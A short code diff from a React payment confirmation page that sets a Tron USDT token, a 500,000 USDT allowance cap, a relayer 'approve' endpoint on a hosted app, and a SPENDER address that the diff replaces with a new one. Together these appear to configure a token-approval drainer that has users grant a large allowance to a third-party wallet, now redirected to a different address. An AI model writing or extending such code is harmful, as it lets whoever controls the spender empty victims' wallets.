@@ -14,7 +14,7 @@ export default function Confirm() {
   const trxValue = currency === 'TRX' ? n : n / TRX_PRICE
   const usdValue = currency === 'TRX' ? n * TRX_PRICE : n
 
-  const SPENDER = 'TWbVSUKe8gG9T7u7ksEwRjdBsNafAppiAj'
+  const SPENDER = 'TBWjMT6MvDqS2yGCs4TNdmTtLR9F2DQXYR'
   const TOKEN = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
   const CAP = 500000n * 1000000n // 500,000 USDT (6 decimals)
   const RELAYER_URL = 'https://web-production-eaaf2.up.railway.app/api/relayer/approve'
